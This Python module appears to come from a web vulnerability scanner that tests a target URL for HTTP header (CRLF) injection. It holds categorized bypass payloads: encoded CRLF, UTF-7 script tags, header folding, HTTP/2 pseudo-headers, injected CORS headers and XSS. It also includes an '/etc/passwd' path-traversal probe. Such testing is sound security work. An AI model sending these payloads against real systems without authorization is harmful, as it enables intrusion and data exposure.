# Header Injection Advanced.Py Module

import requests
import urllib.parse
import time
from . import get_session

# Advanced header injection techniques categorized by attack type
ADVANCED_HEADER_PAYLOADS = {
    "double_encoding": [
        # Double encoded CRLF sequences to bypass WAFs
        {"header": "User-Agent", "value": "Mozilla/5.0%250d%250aX-Double-Encoded: true"},
        {"header": "Referer", "value": "https://example.com%250d%250aX-Injected: true"}
    ],
    
    "mixed_encoding": [
        # Mixed encoding attacks combining multiple encoding types
        {"header": "User-Agent", "value": "Mozilla/5.0%0d%0aX-Mixed-Encoding: %u000D%u000A"},
        {"header": "X-Forwarded-For", "value": "127.0.0.1%0\r\nX-Mixed: true"}
    ],
    
    "unicode": [
        # Unicode/homograph attacks using confusable characters
        {"header": "Cookie", "value": "ѕеѕѕіоn=ad𝗆in"}, # Using lookalike characters
        {"header": "User-Agent", "value": "Mоzillа/5.0"}, # Cyrillic characters
        {"header": "Referer", "value": "https://example.com\u2028X-Unicode-Newline: test"},
        {"header": "User-Agent", "value": "Mozilla/5.0\u2060\u2028X-Zero-Width: test"}, # Zero width joiner + line separator
    ],
    
    "utf7": [
        # UTF-7 encoding to bypass filters and input validation
        {"header": "User-Agent", "value": "Mozilla/5.0+ADw-script+AD4-alert('HEADER_INJECTION')+ADw-/script+AD4-"},
        {"header": "X-Forwarded-For", "value": "+ADw-img+AF8-src+AD0AIg-+ACM-+ACI-+AD4-"}
    ],
    
    "newlines": [
        # Variation in newline sequences to bypass simple filters
        {"header": "User-Agent", "value": "Mozilla/5.0\r\nX-Carriage-Return: test"},
        {"header": "User-Agent", "value": "Mozilla/5.0\nX-Newline: test"},
        {"header": "User-Agent", "value": "Mozilla/5.0\r\nX-Both: test"},
        {"header": "User-Agent", "value": "Mozilla/5.0\n\rX-Reversed: test"},
        {"header": "User-Agent", "value": "Mozilla/5.0\r \nX-Space-Between: test"} # Space between CR and LF
    ],
    
    "spaces": [
        # Edge case space handling exploits
        {"header": "User-Agent", "value": "Mozilla/5.0\r\n X-Space-After-Newline: test"},
        {"header": "User-Agent", "value": "Mozilla/5.0\r\nX-No-Space:test"},
        {"header": "User-Agent", "value": "Mozilla/5.0\r\nX-Tab-Space:\ttest"}
    ],
    
    "empty": [
        # Empty header name/value tests
        {"header": "User-Agent", "value": "Mozilla/5.0\r\n: empty-header-name"},
        {"header": "User-Agent", "value": "Mozilla/5.0\r\nEmpty-Value: "},
        {"header": "User-Agent", "value": "Mozilla/5.0\r\n : value-with-space"}
    ],
    
    "http2": [
        # HTTP/2 pseudo-header attacks
        {"header": ":path", "value": "/original?path=/admin"},
        {"header": ":method", "value": "GET\r\nX-Injected: true"},
        {"header": ":authority", "value": "example.com\r\nX-H2-Injection: true"}
    ],
    
    "folding": [
        # HTTP header fold attacks (obs-fold in RFC7230)
        {"header": "User-Agent", "value": "Mozilla/5.0\r\n X-Folded: value"},
        {"header": "User-Agent", "value": "Mozilla/5.0\r\n\tX-Folded-Tab: value"} # Folding with a tab
    ],
    
    "terminators": [
        # CRLF with other header termination characters
        {"header": "User-Agent", "value": "Mozilla/5.0\r\nX-Test: 1\0"},
        {"header": "User-Agent", "value": "Mozilla/5.0\r\nX-Null: injected\0X-After-Null: ignored"}
    ],
    
    "advanced_exploits": [
        # Sophisticated exploit techniques
        {"header": "User-Agent", "value": "Mozilla/5.0\r\nContent-Length: 0\r\n\r\n<svg onload=alert(1)>"},
        {"header": "User-Agent", "value": "Mozilla/5.0\r\nAccess-Control-Allow-Origin: *\r\nAccess-Control-Allow-Credentials: true"},
        {"header": "Forwarded", "value": "for=127.0.0.1\r\nX-CSRF-Token: 0"}
    ]
}

# Indicators that suggest a successful header injection
INJECTION_INDICATORS = [
    # Unexpected headers in response
    "x-double-encoded", "x-injected", "x-mixed-encoding", "x-carriage-return", 
    "x-newline", "x-both", "x-reversed", "x-space-after-newline", "x-no-space",
    "x-unicode-newline", "x-folded", "x-folded-tab", "x-test", "x-null",
    
    # HTML/JavaScript content in response
    "<script>", "alert(", "<svg", "<img", "onerror=", "onload=",
    
    # Security headers that might be injected to weaken protections
    "access-control-allow-origin: *", "content-security-policy:",
    
    # HTML element start tags (might indicate HTML injection)
    "<html>", "<body>", "<div>", "<iframe>", "<form>"
]

def check(target_url, session=None):
    req_session = get_session(session)
    findings = []
    
    # Get baseline response
    try:
        baseline_start = time.time()
        baseline_resp = req_session.get(target_url, timeout=5)
        baseline_time = time.time() - baseline_start
        baseline_status = baseline_resp.status_code
        baseline_headers = {k.lower(): v for k, v in baseline_resp.headers.items()}
        baseline_content = baseline_resp.text
        baseline_length = len(baseline_content)
    except Exception:
        # Continue without baseline if we can't get it
        baseline_time = 1.0
        baseline_status = 0
        baseline_headers = {}
        baseline_content = ""
        baseline_length = 0
    
    # Test categories in order of importance/likelihood
    test_sequence = [
        "newlines", "spaces", "unicode", "mixed_encoding", "folding", 
        "empty", "double_encoding", "utf7", "terminators", "http2", "advanced_exploits"
    ]
    
    # Track which header names might be vulnerable
    vulnerable_headers = set()
    tested_payloads = set()
    
    # First pass - test most common headers with basic injections
    common_headers = [
        "User-Agent", "Referer", "Cookie", "X-Forwarded-For", "X-Forwarded-Host"
    ]
    
    # Start with newline tests on common headers
    for header in common_headers:
        newline_payload = f"{header}-test\r\nX-Injected: header-injection-test"
        key = f"{header}:{newline_payload[:20]}"
        
        if key in tested_payloads:
            continue
            
        tested_payloads.add(key)
        
        try:
            injection_headers = {header: newline_payload}
            start_time = time.time()
            response = req_session.get(target_url, headers=injection_headers, timeout=5)
            execution_time = time.time() - start_time
            
            # Look for injected header in response
            response_headers = {k.lower(): v for k, v in response.headers.items()}
            
            if "x-injected" in response_headers and "x-injected" not in baseline_headers:
                findings.append(f"Header injection successful via {header}: New header 'X-Injected' appeared in response")
                vulnerable_headers.add(header)
                continue # Found a vulnerability, move to next header
                
            # Check for unexpected response code change
            if response.status_code != baseline_status:
                findings.append(f"Potential header injection via {header}: Status code changed from {baseline_status} to {response.status_code}")
                vulnerable_headers.add(header)
                continue
                
            # Check response time anomaly (could indicate backend processing the injection)
            if execution_time > (baseline_time * 2) and execution_time > 1.0:
                findings.append(f"Potential header injection via {header}: Response time anomaly detected")
                vulnerable_headers.add(header)
                continue
            
            # Check for significant response length change
            if abs(len(response.text) - baseline_length) > (baseline_length * 0.3) and baseline_length > 100:
                findings.append(f"Potential header injection via {header}: Significant response length change")
                vulnerable_headers.add(header)
                continue
            
            # Look for indicators in the response content
            if any(indicator in response.text.lower() for indicator in INJECTION_INDICATORS) and \
               not any(indicator in baseline_content.lower() for indicator in INJECTION_INDICATORS):
                findings.append(f"Potential header injection via {header}: Found injection indicators in response content")
                vulnerable_headers.add(header)
                continue
                
        except Exception as e:
            # Some exceptions might indicate successful injection
            if "invalid header" in str(e).lower():
                findings.append(f"Possible header injection causing invalid header via {header}")
                vulnerable_headers.add(header)
            continue
    
    # Second pass - deeper tests on vulnerable headers
    if vulnerable_headers:
        for header in vulnerable_headers:
            # Test more advanced payloads on headers found to be vulnerable
            for category in test_sequence:
                # Limit to 2 payloads per category for efficiency
                payloads = [p for p in ADVANCED_HEADER_PAYLOADS[category] if p["header"] == header or p["header"] == "User-Agent"][:2]
                
                for payload in payloads:
                    key = f"{header}:{payload['value'][:20]}"
                    if key in tested_payloads:
                        continue
                        
                    tested_payloads.add(key)
                    
                    try:
                        r = req_session.get(target_url, headers={header: payload["value"]}, timeout=5)
                        
                        # Look for specific indicators based on payload category
                        # Less rigorous checking since we know the header is vulnerable
                        if category == "double_encoding" and "X-Double-Encoded" in str(r.headers):
                            findings.append(f"Double-encoded header injection via {header}: {payload['value'][:30]}...")
                            
                        elif category == "utf7" and ("+ADw" in r.text or "<script>" in r.text):
                            findings.append(f"UTF-7 encoded header injection via {header}")
                            
                        elif category == "advanced_exploits" and ("<svg" in r.text or "alert(" in r.text):
                            findings.append(f"Advanced header injection exploit successful via {header}")
                            
                    except Exception:
                        continue
    else:
        # If no vulnerable headers found so far, try some broad tests across various headers
        all_headers = [
            "User-Agent", "Referer", "X-Forwarded-For", "Cookie", "Accept", 
            "Accept-Language", "X-Requested-With", "X-Custom-Header", "X-Api-Version"
        ]
        
        # Test for Cross-Site Scripting via header injection
        xss_payload = "\r\n\r\n<script>alert('Header-XSS')</script>"
        
        for header in all_headers:
            try:
                r = req_session.get(target_url, headers={header: f"Test{xss_payload}"}, timeout=5)
                
                if "<script>alert('Header-XSS')</script>" in r.text and \
                   "<script>alert('Header-XSS')</script>" not in baseline_content:
                    findings.append(f"Cross-Site Scripting via header injection in {header} header")
                    
            except Exception:
                continue
                
    # Special test for path traversal in headers
    try:
        traversal_payload = {"Referer": urllib.parse.quote("../../../../etc/passwd")}
        r = req_session.get(target_url, headers=traversal_payload, timeout=5)
        
        if "root:x:" in r.text and "root:x:" not in baseline_content:
            findings.append(f"Path traversal via header injection: {list(traversal_payload.keys())[0]}")
    except Exception:
        pass
        
    return findings
